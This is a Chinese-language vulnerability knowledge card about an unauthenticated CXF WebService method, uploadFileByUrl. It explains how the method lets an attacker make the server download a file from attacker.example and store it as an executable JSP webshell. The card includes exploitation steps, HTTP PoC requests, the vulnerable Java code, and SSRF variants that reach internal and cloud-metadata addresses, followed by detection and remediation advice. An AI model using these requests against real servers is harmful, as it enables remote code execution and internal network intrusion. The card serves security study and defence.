---
id: web-generic-file-upload-cxf-webservice-uploadfilebyurl-suffix-webshell
title: CXF WebService uploadFileByUrl 抓取任意 URL 内容并按自定义 suffix 落盘：远程拉取式上传 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: cxf-webservice-upload-url-suffix-arbitrary-write
aliases:
- uploadFileByUrl 任意文件上传
- WebService 远程上传后缀可控
- 通过 URL 上传 webshell
- CXF 接口远程下载落盘
- ueditor 抓图式上传变体
tags:
- java
- cxf
- webservice
- file-upload
- ssrf
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-21
  verified_at: '2026-11-08T12:49:23+08:00'
  notes: 已对照原文核对：/ws/ 服务列表与 WADL uploadFileByUri 资源、@POST uploadFileByUrl 源码（md5(url)+'.'+suffix 拼接）、downloadNet HttpURLConnection 落盘、请求 url+suffix=jsp 返回 /attachment/mp4/<md5>.jsp 且访问解析成功，截图 28-34 均吻合；已修正原理中 12 秒超时为 120 秒连接超时（代码 setConnectTimeout(120000)）；dedup_review 对比 ssrf-host-header-download-webroot-rce 成立（本卡显式 url 参数+可控 suffix，非 Host 头控制回源）；原文未给出系统名称版本，无 affected_versions。
---

## 一句话结论

CXF 暴露的 REST/WebService 接口 `uploadFileByUrl(url, suffix)` 只把 `url` 取 MD5 当文件名、把 `suffix` 直接拼成扩展名，然后由服务端主动 HTTP 拉取该 URL 的内容写入 `Web 根/attachment/mp4/`；攻击者把自己的文件放到 VPS 上、`suffix` 传 `jsp`，即可让服务器从外部拉取并落盘一个可执行脚本，返回的 `path` 就是 webshell 地址。

## 原理

- 该接口的业务语义是“给一个图片/视频 URL 和服务端保存后缀，由服务器代为下载”，因此天然包含“服务端发起出站请求”（SSRF 原语）+“把响应体写文件”两个动作，输入完全来自请求参数。
- 文件名由 `FlymeMD5Util.md5(url)` 生成，攻击者无法控制主体名，但 `suffix` 被直接字符串拼进路径（`+ "." + suffix`），扩展名完全可控；只要落盘目录在 Web 根内且容器解析 JSP，扩展名可控就等于可执行。
- `downloadNet()` 用 `HttpURLConnection` 建连、120 秒连接超时、读全部字节后 `FileOutputStream.write()`，没有内容类型、大小、魔数校验，也不校验 URL 是否指向内网——所以既能上传任意内容，也能探测内网 HTTP 服务。
- 接口挂在 `/ws/*` 下、通过 CXF 的 `CXFServlet` 暴露，往往与业务鉴权体系分离（`wsfilter` 只做消息处理），匿名即可调用，形成前台入口。
- 因为内容由服务器“拉取”而非客户端“上传”，这类接口常被 WAF 的上传规则漏掉：请求体里没有文件内容，只有一个 URL 字符串。

## 触发条件

- 目标使用 CXF 暴露 WebService/REST 接口，且存在按 URL 抓取并落盘的上传方法（`uploadFileByUrl`、`uploadByUrl`、`grabImage`、`saveRemoteFile` 等）。
- `suffix`/`ext`/`fileType` 等扩展名参数由客户端控制且未做白名单。
- 落盘目录位于 Web 根内（如 `/attachment/mp4/`），容器允许该目录解析脚本。
- 接口未做鉴权，或可被未授权访问。

## 利用步骤

1. 访问 CXF 的服务列表（`/ws/` 或 `/services/`）与 WADL（`/ws/?wsdl`、`/ws/wadl?_wadl`），枚举可用方法，找 URL 抓取类上传接口。
2. 在自己的可控主机上放置一个最小 JSP 文件，起一个临时 HTTP 服务提供该文件。
3. 调用 `uploadFileByUrl`，`url` 指向该文件，`suffix` 传 `jsp`。
4. 响应 JSON 的 `data` 字段返回落盘相对路径（形如 `/attachment/mp4/<md5>.jsp`）。
5. 访问该路径，确认 JSP 被解析执行；若返回源码说明目录禁用了脚本解析，可改试 `jspx`、`war` 或覆盖已有配置文件。

## PoC

```http
GET /ws/ HTTP/1.1
Host: target
```

```http
POST /ws/wadl/channel/uploadFileByUrl HTTP/1.1
Host: target
Content-Type: application/json

{"url":"http://attacker.example:10001/1.txt","suffix":"jsp"}
```

响应：

```json
{"data":"/attachment/mp4/29cb9480b9538f610d43e25feec4e6f6.jsp"}
```

```http
GET /attachment/mp4/29cb9480b9538f610d43e25feec4e6f6.jsp HTTP/1.1
Host: target
```

对应服务端逻辑：

```java
String path = ServiceContext._singleton().getHostRealPath();
String p = "/attachment/mp4/" + FlymeMD5Util.md5(url) + "." + suffix;
downloadNet(url, String.valueOf(path) + p);
```

## 变体与关联

- 变体：`url` 指向内网地址（`http://127.0.0.1:8080/...`、云元数据 `169.254.169.254`）时，即使不落盘也构成 SSRF；落盘后可从 `attachment` 目录读取响应内容回显。
- 变体：`suffix` 传 `html/svg` 可做存储型 XSS；传 `jsp`/`jspx`/`war` 尝试 getshell。
- 关联：与 UEditor 抓取远程图片、`saveRemoteImage` 一类接口同源；同系统内 multipart 上传见 [[web-generic-file-upload-java-upload-servlet-unauth-diskfileupload]]。
- 边界：若服务端对 `suffix` 做白名单（仅图片/视频）、或落盘目录禁止脚本解析、或接口要求鉴权且做了来源校验，则本链不成立；原文演示到上传并访问 JSP 成功。

## 检测与防御

- 检测：`/ws/*` 接口出现含外部域名/IP 的 `url` 参数；服务端对非业务域名的出站 HTTP 请求；`attachment` 目录出现 `.jsp/.jspx/.war` 文件。
- 修复：`suffix` 改服务端白名单映射（只允许图片/视频扩展名）；落盘目录移出 Web 根或禁用脚本解析；限制出站目标为受信域名白名单，禁止内网与元数据地址。
- 加固：CXF 接口统一纳入鉴权与限流；对下载内容做 Content-Type 与魔数校验、限制大小；把远程抓取能力下沉到独立服务并隔离网络。
